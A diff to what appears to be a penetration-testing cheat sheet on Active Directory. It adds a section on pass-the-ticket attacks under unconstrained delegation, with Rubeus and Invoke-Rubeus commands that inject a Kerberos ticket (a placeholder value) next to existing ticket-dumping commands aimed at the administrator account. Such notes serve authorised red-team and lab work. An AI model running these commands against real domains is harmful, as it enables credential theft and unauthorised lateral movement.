@@ -1335,11 +1335,13 @@ or it may be possible to force a sensitive system to authenticate through the pr
 .\Rubeus.exe dump /nowrap /user:administrator
 .\Rubeus.exe dump /nowrap /luid:0xd62d4
 ```
-
-
-
-
-
+##### UNCONSTRAINED DELEGATION RUBEUS - PASS THE TICKET (TGT)
+```
+Rubeus.exe ptt /ticket:sdjadjaspjdapsidpsaijpiasdiasjDCCBdygAwI9DQUw=
+```
+```
+Invoke-Rubeus 'ptt /ticket:sdjadjaspjdapsidpsaijpiasdiasjDCCBdygAwI9DQUw='
+```
 
 
 
